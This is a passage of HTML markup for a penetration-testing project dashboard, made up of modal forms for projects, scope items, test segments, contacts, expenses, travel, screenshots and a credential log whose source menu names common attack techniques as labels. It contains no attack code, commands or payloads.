                                <button class="bulk-btn" onclick="bulkExportHistory()">Export Selected</button>
                                <button class="bulk-btn danger" onclick="bulkDeleteHistory()">Delete Selected</button>
                            </div>
                        </div>
                    </div>
                </div>
        </main>
    </div>
    
    <!-- Modals -->
    <!-- Switch Project Modal -->
    <div class="modal-overlay" id="switchProjectModal">
        <div class="modal">
            <div class="modal-header">
                <h3 class="modal-title">Switch Project</h3>
                <button class="close-btn" onclick="closeModal('switchProjectModal')">&times;</button>
            </div>
            <div class="project-list">
                <div class="project-item active" onclick="switchProject('alpha')">
                    <div class="project-item-info">
                        <h4>Project Alpha</h4>
                        <div class="project-item-meta">Acme Corp  #PA-2025-001</div>
                    </div>
                    <div class="project-item-status status-active">Active</div>
                </div>
                <div class="project-item" onclick="switchProject('beta')">
                    <div class="project-item-info">
                        <h4>Project Beta</h4>
                        <div class="project-item-meta">TechCorp Ltd  #PB-2025-002</div>
                    </div>
                    <div class="project-item-status status-active">Active</div>
                </div>
                <div class="project-item" onclick="switchProject('gamma')">
                    <div class="project-item-info">
                        <h4>Project Gamma</h4>
                        <div class="project-item-meta">DataSys Inc  #PG-2024-015</div>
                    </div>
                    <div class="project-item-status status-completed">Completed</div>
                </div>
            </div>
            <div class="modal-footer">
                <button class="modal-btn btn-primary" onclick="updateProjectInfo()">Save Changes</button>
                <button class="modal-btn btn-secondary" onclick="closeModal('editProjectModal')">Cancel</button>
            </div>
        </div>
    </div>
    
    <!-- Expense Modal -->
    <div class="modal-overlay" id="expenseModal">
        <div class="modal">
            <div class="modal-header">
                <h3 class="modal-title">Add Expense</h3>
                <button class="close-btn" onclick="closeModal('expenseModal')">&times;</button>
            </div>
            <div class="form-group">
                <label class="form-label">Category</label>
                <div class="category-grid">
                    <button type="button" class="category-btn active" onclick="selectCategory(this)">Food</button>
                    <button type="button" class="category-btn" onclick="selectCategory(this)">Travel</button>
                    <button type="button" class="category-btn" onclick="selectCategory(this)">Accommodation</button>
                    <button type="button" class="category-btn" onclick="selectCategory(this)">Equipment</button>
                </div>
            </div>
            <div class="form-group">
                <label class="form-label">Amount</label>
                <input type="number" class="form-input" placeholder="0.00" step="0.01">
            </div>
            <div class="form-group">
                <label class="form-label">Date</label>
                <input type="date" class="form-input" id="expenseDate">
            </div>
            <div class="form-group">
                <label class="form-label">Description</label>
                <textarea class="form-textarea" placeholder="Brief description of the expense..."></textarea>
            </div>
            <div class="form-group">
                <label class="form-label">Receipt</label>
                <div class="upload-zone">
                    <div class="upload-icon"></div>
                    <div class="upload-text">Click to upload receipt</div>
                </div>
            </div>
            <div class="form-group">
                <div class="toggle-container">
                    <label class="form-label" style="margin-bottom: 0;">Billable to Client</label>
                    <label class="toggle-switch">
                        <input type="checkbox" class="toggle-input" checked>
                        <span class="toggle-slider"></span>
                    </label>
                </div>
            </div>
            <div class="modal-footer">
                <button class="modal-btn btn-primary" onclick="alert('Expense added!'); closeModal('expenseModal');">Add Expense</button>
                <button class="modal-btn btn-secondary" onclick="closeModal('expenseModal')">Cancel</button>
            </div>
        </div>
    </div>
    
    <!-- Add/Edit Segment Modal -->
    <div class="modal-overlay" id="addSegmentModal">
        <div class="modal">
            <div class="modal-header">
                <h3 class="modal-title">Add Test Segment</h3>
                <button class="close-btn" onclick="closeModal('addSegmentModal')">&times;</button>
            </div>
            <div class="form-group">
                <label class="form-label">Segment Type</label>
                <select class="form-select" id="segmentType" onchange="updateSegmentFields()">
                    <option value="external"> External Perimeter</option>
                    <option value="internal"> Internal Network</option>
                    <option value="webapp"> Web Application</option>
                    <option value="azure"> Azure Cloud</option>
                    <option value="aws"> AWS Cloud</option>
                    <option value="gcp"> GCP Cloud</option>
                    <option value="wireless"> Wireless Networks</option>
                    <option value="mobile"> Mobile Applications</option>
                    <option value="ad"> Active Directory</option>
                    <option value="iot"> IoT Devices</option>
                    <option value="firewall"> Firewall Review</option>
                    <option value="build"> Build Review</option>
                    <option value="breakout"> Breakout Testing</option>
                    <option value="other">Other</option>
                </select>
            </div>
            <div class="form-group">
                <label class="form-label">Segment Name</label>
                <input type="text" class="form-input" id="segmentName" placeholder="e.g., Customer Portal, Employee Directory, etc.">
            </div>
            <div class="form-group">
                <label class="form-label">Status</label>
                <select class="form-select" id="segmentStatus">
                    <option value="planned">Planned</option>
                    <option value="active">Active</option>
                    <option value="completed">Completed</option>
                    <option value="blocked">Blocked</option>
                </select>
            </div>
            <div class="form-group">
                <label class="form-label">Start Date (optional)</label>
                <input type="date" class="form-input" id="segmentStartDate">
            </div>
            <div class="form-group">
                <label class="form-label">End Date (optional)</label>
                <input type="date" class="form-input" id="segmentEndDate">
            </div>
            <div class="form-group">
                <label class="form-label">Description & Notes</label>
                <textarea class="form-textarea" id="segmentNotes" placeholder="Detailed description of testing scope, requirements, access needed, etc..."></textarea>
            </div>
            <div class="modal-footer">
                <button class="modal-btn btn-primary" onclick="saveSegment()">Add Segment</button>
                <button class="modal-btn btn-secondary" onclick="closeModal('addSegmentModal')">Cancel</button>
            </div>
        </div>
    </div>
    
    <!-- Add Scope Item Modal -->
    <div class="modal-overlay" id="addScopeItemModal">
        <div class="modal">
            <div class="modal-header">
                <h3 class="modal-title">Add Scope Item</h3>
                <button class="close-btn" onclick="closeModal('addScopeItemModal')">&times;</button>
            </div>
            <div class="form-group">
                <label class="form-label">Item Type</label>
                <select class="form-select" id="scopeItemType" onchange="updateScopeItemFields()">
                    <option value="urls">URL</option>
                    <option value="domains">Domain</option>
                    <option value="hosts">Hostname</option>
                    <option value="config">Configuration Document</option>
                    <option value="azure">Azure Resource</option>
                    <option value="aws">AWS Resource</option>
                    <option value="gcp">GCP Resource</option>
                    <option value="wireless">SSID</option>
                    <option value="devices">Device/Application</option>
                </select>
            </div>
            <div class="form-group">
                <label class="form-label" id="scopeItemLabel">URL/Target</label>
                <input type="text" class="form-input" id="scopeItemTarget" placeholder="https://example.com">
            </div>
            <div class="form-group">
                <label class="form-label">Description & Notes</label>
                <textarea class="form-textarea" id="scopeItemNotes" placeholder="Additional details about this scope item..."></textarea>
            </div>
            <div class="modal-footer">
                <button class="modal-btn btn-primary" onclick="saveScopeItem()">Add Scope Item</button>
                <button class="modal-btn btn-secondary" onclick="closeModal('addScopeItemModal')">Cancel</button>
            </div>
        </div>
    </div>
    
    <!-- Add History Entry Modal -->
    <div class="modal-overlay" id="addHistoryModal">
        <div class="modal">
            <div class="modal-header">
                <h3 class="modal-title">Add History Entry</h3>
                <button class="close-btn" onclick="closeModal('addHistoryModal')">&times;</button>
            </div>
            <div class="form-group">
                <label class="form-label">Entry Type</label>
                <select class="form-select" id="historyType">
                    <option value="testing">Testing Activity</option>
                    <option value="finding">Finding Discovered</option>
                    <option value="milestone">Project Milestone</option>
                    <option value="communication">Communication</option>
                    <option value="issue">Issue/Problem</option>
                    <option value="note">General Note</option>
                </select>
            </div>
            <div class="form-group">
                <label class="form-label">Title/Summary</label>
                <input type="text" class="form-input" id="historyTitle" placeholder="Brief description of activity">
            </div>
            <div class="form-group">
                <label class="form-label">Date & Time</label>
                <div style="display: flex; gap: 0.5rem;">
                    <input type="date" class="form-input" id="historyDate" style="flex: 2;">
                    <input type="time" class="form-input" id="historyTime" style="flex: 1;">
                </div>
            </div>
            <div class="form-group">
                <label class="form-label">Detailed Notes</label>
                <textarea class="form-textarea" id="historyNotes" placeholder="Detailed description of what happened, findings, actions taken, etc..."></textarea>
            </div>
            <div class="form-group">
                <label class="form-label">Severity/Priority (for findings and issues)</label>
                <select class="form-select" id="historySeverity">
                    <option value="">Not applicable</option>
                    <option value="low">Low</option>
                    <option value="medium">Medium</option>
                    <option value="high">High</option>
                    <option value="critical">Scope Item</option>
                </select>
            </div>
            <div class="modal-footer">
                <button class="modal-btn btn-primary" onclick="saveHistoryEntry()">Add Entry</button>
                <button class="modal-btn btn-secondary" onclick="closeModal('addHistoryModal')">Cancel</button>
            </div>
        </div>
    </div>
    
    <!-- Add/Edit Contact Modal -->
    <div class="modal-overlay" id="addContactModal">
        <div class="modal">
            <div class="modal-header">
                <h3 class="modal-title">Add Contact</h3>
                <button class="close-btn" onclick="closeModal('addContactModal')">&times;</button>
            </div>
            <div class="form-group">
                <label class="form-label">Full Name</label>
                <input type="text" class="form-input" id="contactName" placeholder="John Smith">
            </div>
            <div class="form-group">
                <label class="form-label">Title / Position</label>
                <input type="text" class="form-input" id="contactTitle" placeholder="Chief Information Security Officer">
            </div>
            <div class="form-group">
                <label class="form-label">Email Address</label>
                <input type="email" class="form-input" id="contactEmail" placeholder="john.smith@company.com">
            </div>
            <div class="form-group">
                <label class="form-label">Phone Number</label>
                <input type="tel" class="form-input" id="contactPhone" placeholder="+44 7700 900000">
            </div>
            <div class="form-group">
                <label class="form-label">Role Tags (select all that apply)</label>
                <div class="category-grid" style="grid-template-columns: repeat(2, 1fr);">
                    <button type="button" class="category-btn" onclick="toggleTag(this, 'emergency')">Emergency</button>
                    <button type="button" class="category-btn" onclick="toggleTag(this, 'technical')">Technical</button>
                    <button type="button" class="category-btn" onclick="toggleTag(this, 'receive-report')">Receive Report</button>
                    <button type="button" class="category-btn" onclick="toggleTag(this, 'account-manager')">Account Manager</button>
                    <button type="button" class="category-btn" onclick="toggleTag(this, 'security-consultant')">Security Consultant</button>
                    <button type="button" class="category-btn" onclick="toggleTag(this, 'primary')">Primary</button>
                    <button type="button" class="category-btn" onclick="toggleTag(this, 'escalation')">Escalation</button>
                </div>
            </div>
            <div class="form-group">
                <label class="form-label">Notes</label>
                <textarea class="form-textarea" id="contactNotes" placeholder="Additional information about this contact..."></textarea>
            </div>
            <div class="modal-footer">
                <button class="modal-btn btn-primary" onclick="saveContact()">Save Contact</button>
                <button class="modal-btn btn-secondary" onclick="closeModal('addContactModal')">Cancel</button>
            </div>
        </div>
    </div>
    
    <!-- Secure Transfer Modal -->
    <div class="modal-overlay" id="secureTransferModal">
        <div class="modal">
            <div class="modal-header">
                <h3 class="modal-title">Secure Transfer Platform</h3>
                <button class="close-btn" onclick="closeModal('secureTransferModal')">&times;</button>
            </div>
            <div class="form-group">
                <label class="form-label">Transfer Platform URL</label>
                <input type="url" class="form-input" id="transferUrl" placeholder="https://your-secure-platform.com/project-link" value="https://securefiletransfer.example.com/project-alpha-2025">
            </div>
            <div class="form-group">
                <label class="form-label">Platform Name</label>
                <input type="text" class="form-input" id="transferPlatform" placeholder="e.g., Egnyte, SendSafely, etc." value="Project File Transfer Portal">
            </div>
            <div class="form-group">
                <label class="form-label">Notes</label>
                <textarea class="form-textarea" id="transferNotes" placeholder="Additional notes about the transfer platform..."></textarea>
            </div>
            <div class="modal-footer">
                <button class="modal-btn btn-primary" onclick="openSecureTransfer()"> Open Transfer Link</button>
                <button class="modal-btn btn-primary" onclick="updateTransferLink()">Save Changes</button>
                <button class="modal-btn btn-secondary" onclick="closeModal('secureTransferModal')">Close</button>
            </div>
        </div>
    </div>
    
    <!-- Upload Document Modal -->
    <div class="modal-overlay" id="uploadDocModal">
        <div class="modal">
            <div class="modal-header">
                <h3 class="modal-title">Upload Document</h3>
                <button class="close-btn" onclick="closeModal('uploadDocModal')">&times;</button>
            </div>
            <div class="form-group">
                <label class="form-label">Document Category</label>
                <select class="form-select" id="docCategory">
                    <option value="presales">Presales</option>
                    <option value="authorization">Authorization</option>
                    <option value="contracts">Contracts</option>
                    <option value="reports">Reports</option>
                    <option value="other">Other</option>
                </select>
            </div>
            <div class="form-group">
                <label class="form-label">Document Title</label>
                <input type="text" class="form-input" id="docTitle" placeholder="Enter document name">
            </div>
            <div class="form-group">
                <label class="form-label">File Upload</label>
                <div class="upload-zone" onclick="document.getElementById('fileUpload').click()">
                    <div class="upload-icon"></div>
                    <div class="upload-text">Click to select file</div>
                    <input type="file" id="fileUpload" style="display: none;" accept=".pdf,.doc,.docx,.txt,.png,.jpg,.jpeg">
                </div>
            </div>
            <div class="form-group">
                <label class="form-label">Description</label>
                <textarea class="form-textarea" id="docDescription" placeholder="Brief description of the document..."></textarea>
            </div>
            <div class="modal-footer">
                <button class="modal-btn btn-primary" onclick="uploadDocument()">Upload Document</button>
                <button class="modal-btn btn-secondary" onclick="closeModal('uploadDocModal')">Cancel</button>
            </div>
        </div>
    </div>
    
    <!-- New Task Modal -->
    <div class="modal-overlay" id="newTaskModal">
        <div class="modal">
            <div class="modal-header">
                <h3 class="modal-title">Add New Task</h3>
                <button class="close-btn" onclick="closeModal('newTaskModal')">&times;</button>
            </div>
            <div class="form-group">
                <label class="form-label">Task Title</label>
                <input type="text" class="form-input" id="taskTitle" placeholder="Enter task description">
            </div>
            <div class="form-group">
                <label class="form-label">Category</label>
                <select class="form-select" id="taskCategory">
                    <option value="admin">Administrative</option>
                    <option value="urgent">Urgent</option>
                    <option value="client">Client Communication</option>
                    <option value="compliance">Compliance</option>
                    <option value="logistics">Logistics</option>
                </select>
            </div>
            <div class="form-group">
                <label class="form-label">Due Date</label>
                <input type="date" class="form-input" id="taskDueDate">
            </div>
            <div class="form-group">
                <label class="form-label">Priority</label>
                <select class="form-select" id="taskPriority">
                    <option value="low">Low</option>
                    <option value="medium" selected>Medium</option>
                    <option value="high">High</option>
                    <option value="urgent">Urgent</option>
                </select>
            </div>
            <div class="form-group">
                <label class="form-label">Notes</label>
                <textarea class="form-textarea" id="taskNotes" placeholder="Additional details or instructions..."></textarea>
            </div>
            <div class="modal-footer">
                <button class="modal-btn btn-primary" onclick="addNewTask()">Add Task</button>
                <button class="modal-btn btn-secondary" onclick="closeModal('newTaskModal')">Cancel</button>
            </div>
        </div>
    </div>
    
    <!-- Add/Edit Credential Modal -->
    <div class="modal-overlay" id="addCredentialModal">
        <div class="modal" style="max-width: 800px;">
            <div class="modal-header">
                <h3 class="modal-title">Add Credential</h3>
                <button class="close-btn" onclick="closeModal('addCredentialModal')">&times;</button>
            </div>
            <form id="credentialForm">
                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 1rem;">
                    <div class="form-group">
                        <label class="form-label">Username/Account</label>
                        <input type="text" class="form-input" id="credUsername" placeholder="administrator, svc_backup, user@domain.com">
                    </div>
                    <div class="form-group">
                        <label class="form-label">Credential Type</label>
                        <select class="form-select" id="credentialType" onchange="updateCredentialType()">
                            <option value="user">User Account</option>
                            <option value="service">Service Account</option>
                            <option value="admin">Administrative Account</option>
                            <option value="database">Database Account</option>
                            <option value="ssh-key">SSH Key</option>
                            <option value="api-key">API Key</option>
                            <option value="certificate">Certificate</option>
                            <option value="hash">Password Hash</option>
                        </select>
                    </div>
                </div>
                
                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 1rem;">
                    <div class="form-group">
                        <label class="form-label">Source</label>
                        <select class="form-select" id="credentialSource">
                            <option value="client-provided">Client Provided</option>
                            <option value="default">Default Credentials</option>
                            <option value="password-spray">Password Spray Attack</option>
                            <option value="kerberoasting">Kerberoasting</option>
                            <option value="asreproasting">ASREPRoasting</option>
                            <option value="smb-share">SMB Share Discovery</option>
                            <option value="ftp-share">FTP Share Discovery</option>
                            <option value="coerced">NTLM Coercion</option>
                            <option value="domain-dump">Domain Dump/LDAP</option>
                            <option value="credential-dump">Credential Dump</option>
                            <option value="hash-dump">Hash Dump</option>
                            <option value="config-file">Configuration File</option>
                            <option value="database-dump">Database Dump</option>
                            <option value="social-engineering">Social Engineering</option>
                            <option value="physical-access">Physical Access</option>
                            <option value="other">Other</option>
                        </select>
                    </div>
                    <div class="form-group">
                        <label class="form-label">Privilege Level</label>
                        <select class="form-select" id="credentialPrivilege">
                            <option value="user">Standard User</option>
                            <option value="local-admin">Local Administrator</option>
                            <option value="domain-admin">Domain Administrator</option>
                            <option value="enterprise-admin">Enterprise Admin</option>
                            <option value="service">Service Account</option>
                            <option value="database-admin">Database Admin</option>
                            <option value="application-admin">Application Admin</option>
                            <option value="backup-operator">Backup Operator</option>
                            <option value="unknown">Unknown</option>
                        </select>
                    </div>
                </div>

                <!-- Password Section -->
                <div id="passwordSection" class="form-group">
                    <label class="form-label">Password</label>
                    <div style="display: flex; gap: 0.5rem;">
                        <input type="password" class="form-input" id="credentialPassword" placeholder="Password123!" style="flex: 1;">
                        <button type="button" class="modal-btn btn-secondary" onclick="togglePasswordVisibility('credentialPassword')" style="padding: 0.5rem;"></button>
                    </div>
                </div>

                <!-- SSH Key Section -->
                <div id="keySection" class="form-group" style="display: none;">
                    <label class="form-label">Private Key</label>
                    <textarea class="form-textarea" id="credentialKey" placeholder="-----BEGIN OPENSSH PRIVATE KEY-----" rows="4"></textarea>
                </div>

                <!-- Hash Section -->
                <div id="hashSection" class="form-group" style="display: none;">
                    <label class="form-label">Hash Value</label>
                    <textarea class="form-textarea" id="credentialHash" placeholder="$krb5tgs$..." rows="2"></textarea>
                    <div class="form-group">
                        <label class="form-label">Hash Type</label>
                        <select class="form-select" id="hashType">
                            <option value="ntlm">NTLM</option>
                            <option value="kerberos">Kerberos TGS</option>
                            <option value="asrep">AS-REP</option>
                            <option value="md5">MD5</option>
                            <option value="sha1">SHA1</option>
                            <option value="sha256">SHA256</option>
                            <option value="bcrypt">bcrypt</option>
                            <option value="other">Other</option>
                        </select>
                    </div>
                </div>

                <!-- Certificate Section -->
                <div id="certSection" class="form-group" style="display: none;">
                    <label class="form-label">Certificate (.pfx/.p12)</label>
                    <div class="upload-zone">
                        <div class="upload-icon"></div>
                        <div class="upload-text">Click to upload certificate file</div>
                    </div>
                    <div class="form-group" style="margin-top: 0.5rem;">
                        <label class="form-label">Certificate Password</label>
                        <input type="password" class="form-input" id="certPassword" placeholder="Certificate password">
                    </div>
                </div>

                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 1rem;">
                    <div class="form-group">
                        <label class="form-label">Target System(s)</label>
                        <input type="text" class="form-input" id="credentialTarget" placeholder="DC01, 192.168.1.100, *.domain.com">
                    </div>
                    <div class="form-group">
                        <label class="form-label">Status</label>
                        <select class="form-select" id="credentialStatus">
                            <option value="untested">Untested</option>
                            <option value="valid">Valid</option>
                            <option value="invalid">Invalid/Expired</option>
                            <option value="locked">Account Locked</option>
                            <option value="disabled">Account Disabled</option>
                        </select>
                    </div>
                </div>

                <div class="form-group">
                    <div class="toggle-container">
                        <label class="form-label" style="margin-bottom: 0;">Sensitive/High-Value Account</label>
                        <label class="toggle-switch">
                            <input type="checkbox" class="toggle-input" id="credentialSensitive">
                            <span class="toggle-slider"></span>
                        </label>
                    </div>
                </div>

                <div class="form-group">
                    <label class="form-label">Additional Notes</label>
                    <textarea class="form-textarea" id="credentialNotes" placeholder="Last verified: 15/11/2024, Works on DC01 and FILE01, Member of Domain Admins group..."></textarea>
                </div>

                <div class="modal-footer">
                    <button type="button" class="modal-btn btn-primary" onclick="addCredential()">Add Credential</button>
                    <button type="button" class="modal-btn btn-secondary" onclick="closeModal('addCredentialModal')">Cancel</button>
                </div>
            </form>
        </div>
    </div>
    
    <!-- Edit Project Modal -->
    <div class="modal-overlay" id="editProjectModal">
        <div class="modal" style="max-width: 700px;">
            <div class="modal-header">
                <h3 class="modal-title">Edit Project</h3>
                <button class="close-btn" onclick="closeModal('editProjectModal')">&times;</button>
            </div>
            <form id="editProjectForm">
                <div style="display: grid; grid-template-columns: 2fr 1fr; gap: 1rem;">
                    <div class="form-group">
                        <label class="form-label">Project Name</label>
                        <input type="text" class="form-input" id="editProjectName" value="Project Alpha" placeholder="Enter project name">
                    </div>
                    <div class="form-group">
                        <label class="form-label">Project Reference</label>
                        <input type="text" class="form-input" id="editProjectRef" value="PA-2025-001" placeholder="PA-2025-001">
                    </div>
                </div>
                
                <div style="display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 1rem;">
                    <div class="form-group">
                        <label class="form-label">Client Name</label>
                        <input type="text" class="form-input" id="editClientName" value="Acme Corporation" placeholder="Client company name">
                    </div>
                    <div class="form-group">
                        <label class="form-label">Client Reference</label>
                        <input type="text" class="form-input" id="editClientRef" value="ACME-SEC-2025-Q1" placeholder="Client's project reference">
                    </div>
                    <div class="form-group">
                        <label class="form-label">Project Type</label>
                        <select class="form-select" id="editProjectType">
                            <option value="pentest" selected>Penetration Test</option>
                            <option value="va">Vulnerability Assessment</option>
                            <option value="red-team">Red Team Exercise</option>
                            <option value="compliance">Compliance Assessment</option>
                            <option value="code-review">Code Review</option>
                            <option value="architecture">Architecture Review</option>
                            <option value="social-engineering">Social Engineering</option>
                        </select>
                    </div>
                </div>
                
                <div style="display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 1rem;">
                    <div class="form-group">
                        <label class="form-label">Start Date</label>
                        <input type="date" class="form-input" id="editStartDate" value="2025-01-15">
                    </div>
                    <div class="form-group">
                        <label class="form-label">End Date</label>
                        <input type="date" class="form-input" id="editEndDate" value="2025-01-29">
                    </div>
                    <div class="form-group">
                        <label class="form-label">Status</label>
                        <select class="form-select" id="editProjectStatus">
                            <option value="planning">Planning</option>
                            <option value="active" selected>Active</option>
                            <option value="testing">Testing</option>
                            <option value="reporting">Reporting</option>
                            <option value="completed">Completed</option>
                            <option value="on-hold">On Hold</option>
                        </select>
                    </div>
                </div>
                
                <div class="form-group">
                    <label class="form-label">Project Description</label>
                    <textarea class="form-textarea" id="editProjectDescription" rows="3" placeholder="Brief description of the project scope and objectives">External and internal penetration testing of Acme Corporation's infrastructure, including web applications and network security assessment.</textarea>
                </div>
                
                <div class="form-group">
                    <div class="toggle-container">
                        <label class="form-label" style="margin-bottom: 0;">Requires NDA</label>
                        <label class="toggle-switch">
                            <input type="checkbox" class="toggle-input" id="editRequiresNDA" checked>
                            <span class="toggle-slider"></span>
                        </label>
                    </div>
                </div>
                
                <div class="form-group">
                    <label class="form-label">Additional Notes</label>
                    <textarea class="form-textarea" id="editProjectNotes" rows="2" placeholder="Any additional notes or special requirements">Testing to be conducted outside business hours. VPN access required for internal testing phase.</textarea>
                </div>
                
                <div class="modal-footer">
                    <button type="button" class="modal-btn btn-primary" onclick="updateProject()">Update Project</button>
                    <button type="button" class="modal-btn btn-secondary" onclick="closeModal('editProjectModal')">Cancel</button>
                </div>
            </form>
        </div>
    </div>
    
    <!-- New Project Modal -->
    <div class="modal-overlay" id="newProjectModal">
        <div class="modal" style="max-width: 700px;">
            <div class="modal-header">
                <h3 class="modal-title">Create New Project</h3>
                <button class="close-btn" onclick="closeModal('newProjectModal')">&times;</button>
            </div>
            <form id="newProjectForm">
                <div style="display: grid; grid-template-columns: 2fr 1fr; gap: 1rem;">
                    <div class="form-group">
                        <label class="form-label">Project Name *</label>
                        <input type="text" class="form-input" id="newProjectName" placeholder="Enter project name" required>
                    </div>
                    <div class="form-group">
                        <label class="form-label">Project Reference</label>
                        <input type="text" class="form-input" id="newProjectRef" placeholder="Auto-generated" readonly style="background: var(--bg-secondary);">
                    </div>
                </div>
                
                <div style="display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 1rem;">
                    <div class="form-group">
                        <label class="form-label">Client Name *</label>
                        <input type="text" class="form-input" id="newClientName" placeholder="Client company name" required>
                    </div>
                    <div class="form-group">
                        <label class="form-label">Client Reference</label>
                        <input type="text" class="form-input" id="newClientRef" placeholder="Client's project reference">
                    </div>
                    <div class="form-group">
                        <label class="form-label">Project Type *</label>
                        <select class="form-select" id="newProjectType" required>
                            <option value="">Select project type</option>
                            <option value="pentest">Penetration Test</option>
                            <option value="va">Vulnerability Assessment</option>
                            <option value="red-team">Red Team Exercise</option>
                            <option value="compliance">Compliance Assessment</option>
                            <option value="code-review">Code Review</option>
                            <option value="architecture">Architecture Review</option>
                            <option value="social-engineering">Social Engineering</option>
                        </select>
                    </div>
                </div>
                
                <div style="display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 1rem;">
                    <div class="form-group">
                        <label class="form-label">Start Date</label>
                        <input type="date" class="form-input" id="newStartDate">
                    </div>
                    <div class="form-group">
                        <label class="form-label">End Date</label>
                        <input type="date" class="form-input" id="newEndDate">
                    </div>
                    <div class="form-group">
                        <label class="form-label">Initial Status</label>
                        <select class="form-select" id="newProjectStatus">
                            <option value="planning" selected>Planning</option>
                            <option value="active">Active</option>
                            <option value="on-hold">On Hold</option>
                        </select>
                    </div>
                </div>
                
                <div class="form-group">
                    <label class="form-label">Project Description</label>
                    <textarea class="form-textarea" id="newProjectDescription" rows="3" placeholder="Brief description of the project scope and objectives"></textarea>
                </div>
                
                <div class="form-group">
                    <div class="toggle-container">
                        <label class="form-label" style="margin-bottom: 0;">Requires NDA</label>
                        <label class="toggle-switch">
                            <input type="checkbox" class="toggle-input" id="newRequiresNDA">
                            <span class="toggle-slider"></span>
                        </label>
                    </div>
                </div>
                
                <div class="modal-footer">
                    <button type="button" class="modal-btn btn-primary" onclick="createProject()">Create Project</button>
                    <button type="button" class="modal-btn btn-secondary" onclick="closeModal('newProjectModal')">Cancel</button>
                </div>
            </form>
        </div>
    </div>

    <!-- New Trip Modal -->
    <div class="modal-overlay" id="newTripModal">
        <div class="modal-content">
            <div class="modal-header">
                <h3>Plan New Trip</h3>
                <button class="modal-close" onclick="closeModal('newTripModal')"></button>
            </div>
            <form>
                <div class="modal-body">
                    <div class="form-group">
                        <label class="form-label">Engagement Name</label>
                        <input type="text" class="form-input" placeholder="e.g., The Shard Penetration Test" required>
                    </div>
                    
                    <div class="form-group">
                        <label class="form-label">Target Location</label>
                        <input type="text" class="form-input" placeholder="Full address of the client site" required>
                    </div>
                    
                    <div class="form-row">
                        <div class="form-group">
                            <label class="form-label">Start Date</label>
                            <input type="date" class="form-input" required>
                        </div>
                        <div class="form-group">
                            <label class="form-label">End Date</label>
                            <input type="date" class="form-input" required>
                        </div>
                    </div>
                    
                    <div class="form-group">
                        <label class="form-label">Home Location</label>
                        <input type="text" class="form-input" placeholder="Your starting location (e.g., Manchester)" required>
                    </div>
                    
                    <div class="form-group">
                        <label class="form-label">Hotel Required?</label>
                        <div style="display: flex; gap: 1rem;">
                            <label style="display: flex; align-items: center; gap: 0.5rem;">
                                <input type="radio" name="hotelRequired" value="yes" onchange="toggleHotelFields(true)"> Yes
                            </label>
                            <label style="display: flex; align-items: center; gap: 0.5rem;">
                                <input type="radio" name="hotelRequired" value="no" onchange="toggleHotelFields(false)"> No
                            </label>
                        </div>
                    </div>
                    
                    <div id="hotelFields" style="display: none;">
                        <div class="form-group">
                            <label class="form-label">Hotel Name</label>
                            <input type="text" class="form-input" id="hotelName" placeholder="e.g., Premier Inn London County Hall">
                        </div>
                        
                        <div class="form-group">
                            <label class="form-label">Hotel Address</label>
                            <input type="text" class="form-input" id="hotelAddress" placeholder="Full address of the hotel">
                        </div>
                        
                        <div class="form-row">
                            <div class="form-group">
                                <label class="form-label">Check-in Date</label>
                                <input type="date" class="form-input" id="checkinDate">
                            </div>
                            <div class="form-group">
                                <label class="form-label">Check-out Date</label>
                                <input type="date" class="form-input" id="checkoutDate">
                            </div>
                        </div>
                    </div>
                    
                    <div class="form-group">
                        <label class="form-label">Journey Segments</label>
                        <div id="journeySegments" style="margin-bottom: 1rem;">
                            <!-- Segments will be added here -->
                        </div>
                        <button type="button" class="action-btn secondary" onclick="addJourneySegment()">+ Add Journey Segment</button>
                    </div>
                    
                    <div class="form-group">
                        <label class="form-label">Notes</label>
                        <textarea class="form-textarea" rows="3" placeholder="Any special requirements or notes"></textarea>
                    </div>
                </div>
                
                <div class="modal-footer">
                    <button type="button" class="modal-btn btn-primary" onclick="createTrip()">Create Trip</button>
                    <button type="button" class="modal-btn btn-secondary" onclick="closeModal('newTripModal')">Cancel</button>
                </div>
            </form>
        </div>
    </div>

    <!-- Upload Screenshot Modal -->
    <div class="modal-overlay" id="uploadScreenshotModal">
        <div class="modal-content">
            <div class="modal-header">
                <h3>Upload Screenshot</h3>
                <button class="modal-close" onclick="closeModal('uploadScreenshotModal')"></button>
            </div>
            <form>
                <div class="modal-body">
                    <div class="form-group">
                        <label class="form-label">Screenshot File</label>
                        <div style="border: 2px dashed var(--border); border-radius: 8px; padding: 2rem; text-align: center; background: var(--bg-secondary);">
                            <div style="font-size: 2rem; margin-bottom: 0.5rem;"></div>
                            <div style="margin-bottom: 1rem;">Drag and drop or click to browse</div>
                            <input type="file" id="screenshotFile" accept="image/*" style="display: none;">
                            <button type="button" class="action-btn secondary" onclick="document.getElementById('screenshotFile').click()">Choose File</button>
                        </div>
                    </div>
                    
                    <div class="form-group">
                        <label class="form-label">Screenshot ID</label>
                        <input type="text" class="form-input" id="screenshotId" value="SCR-004" placeholder="Auto-generated">
                    </div>
                    
                    <div class="form-group">
                        <label class="form-label">Title</label>
                        <input type="text" class="form-input" id="screenshotTitle" placeholder="e.g., XSS Vulnerability Demo" required>
                    </div>
                    
                    <div class="form-group">
                        <label class="form-label">Caption</label>
                        <textarea class="form-textarea" id="screenshotCaption" rows="2" placeholder="Brief description of what the screenshot shows"></textarea>
                    </div>
                    
                    <div class="form-group">
                        <label class="form-label">Capture Instructions</label>
                        <textarea class="form-textarea" id="captureInstructions" rows="3" placeholder="Step-by-step instructions for reproducing this screenshot"></textarea>
                    </div>
                    
                    <div class="form-group">
                        <label class="form-label">Associated Findings</label>
                        <div style="display: flex; gap: 0.5rem; flex-wrap: wrap;">
                            <label style="display: flex; align-items: center; gap: 0.25rem;">
                                <input type="checkbox" value="FIND-001"> FIND-001
                            </label>
                            <label style="display: flex; align-items: center; gap: 0.25rem;">
                                <input type="checkbox" value="FIND-002"> FIND-002
                            </label>
                            <label style="display: flex; align-items: center; gap: 0.25rem;">
                                <input type="checkbox" value="FIND-003"> FIND-003
                            </label>
                            <label style="display: flex; align-items: center; gap: 0.25rem;">
                                <input type="checkbox" value="FIND-004"> FIND-004
                            </label>
                        </div>
                    </div>
                    
                    <div class="form-group">
                        <label class="form-label">Category</label>
                        <select class="form-select" id="screenshotCategory">
                            <option value="web"> Web</option>
                            <option value="network"> Network</option>
